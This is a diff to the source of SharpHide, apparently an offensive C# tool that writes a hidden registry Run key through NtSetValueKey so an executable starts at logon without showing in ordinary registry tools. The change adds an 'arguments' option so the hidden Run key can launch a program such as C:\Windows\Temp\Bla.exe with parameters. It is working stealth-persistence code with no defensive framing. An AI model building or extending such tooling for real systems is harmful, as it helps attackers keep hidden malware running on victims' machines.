@@ -10,7 +10,8 @@ namespace SharpHide
         static void Usage()
         {
             Console.WriteLine("\r\n[+] SharpHide");
-            Console.WriteLine("[+] Create hidden registry (Run) key:\r\n    SharpHide.exe action=create keyvalue=\"C:\\Windows\\Temp\\Bla.exe arg1 arg2\"");
+            Console.WriteLine("[+] Create hidden registry (Run) key:\r\n    SharpHide.exe action=create keyvalue=\"C:\\Windows\\Temp\\Bla.exe\"");
+            Console.WriteLine("[+] Create hidden registry (Run) key with parameters:\r\n    SharpHide.exe action=create keyvalue=\"C:\\Windows\\Temp\\Bla.exe\" arguments=\"arg1 arg2\"");
             Console.WriteLine("[+] Delete hidden registry (Run) key:\r\n    SharpHide.exe action=delete");
         }
 
@@ -179,7 +180,7 @@ namespace SharpHide
                 }
             }
             else {
-                UNICODE_STRING ValueData = new UNICODE_STRING("\"" + arguments["keyvalue"] + "\"");
+                UNICODE_STRING ValueData = new UNICODE_STRING("\"" + arguments["keyvalue"] + "\" " + arguments["arguments"]);
                 Status = NtSetValueKey(regKeyHandle, ValueNamePtr, 0, RegistryKeyType.REG_SZ, ValueData.buffer, ValueData.MaximumLength);
                 if (Status.Equals(STATUS_SUCCESS)) {
                     Console.WriteLine("[+] Key successfully created.");
